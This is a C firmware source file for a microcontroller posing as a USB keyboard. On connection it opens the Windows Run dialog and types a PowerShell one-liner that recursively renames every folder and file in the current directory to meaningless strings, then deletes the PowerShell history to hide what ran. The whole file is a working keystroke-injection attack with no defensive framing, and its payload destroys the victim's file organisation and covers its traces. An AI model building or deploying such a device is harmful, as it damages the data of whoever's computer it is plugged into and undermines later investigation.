#include "src/system.h"
#include "src/delay.h"
#include "src/usb_keyboard.h"

// Prototypes for used interrupts
void USB_interrupt(void);
void USB_ISR(void) __interrupt(INT_NO_USB) {
  USB_interrupt();
}

void main(void) {
  CLK_config();
  DLY_ms(10);
  KBD_init();

  DLY_ms(200);

  KBD_press(KBD_KEY_LEFT_GUI);
  KBD_press('r');
  DLY_ms(80);
  KBD_release('r');
  KBD_release(KBD_KEY_LEFT_GUI);
  
  DLY_ms(200);

  KBD_print("powershell -Command \"cd .; function Rename-Directories { param ([string]$path,[ref]$counter) ; $folders = Get-ChildItem -Path $path -Directory -Recurse | Sort-Object FullName -Descending ; foreach ($folder in $folders) { $newFolderName = \"d\" * $counter.Value ; $newFolderPath = $newFolderName ; $counter.Value++ ; Rename-Item -Path $folder.FullName -NewName $newFolderPath } } ; function Rename-Files { param ([string]$path,[ref]$counter) ; $files = Get-ChildItem -Path $path -File -Recurse ; foreach ($file in $files) { $newFileName = \\\"a\\\" + \\\" \\\" * $counter.Value ; $newFilePath = \"$newFileName\" + $file.Extension ; $counter.Value++ ; Rename-Item -Path $file.FullName -NewName $newFilePath } } ; `$counter = 1 ; Rename-Directories -path . -counter ([ref]`$counter) ; `$counter = 1 ; Rename-Files -path . -counter ([ref]`$counter) ; Remove-Item (Get-PSReadlineOption).HistorySavePath ; exit\""
);
  
  DLY_ms(50);
  KBD_type(KBD_KEY_RETURN);

  while(1) {
    DLY_ms(1000);
  }
}
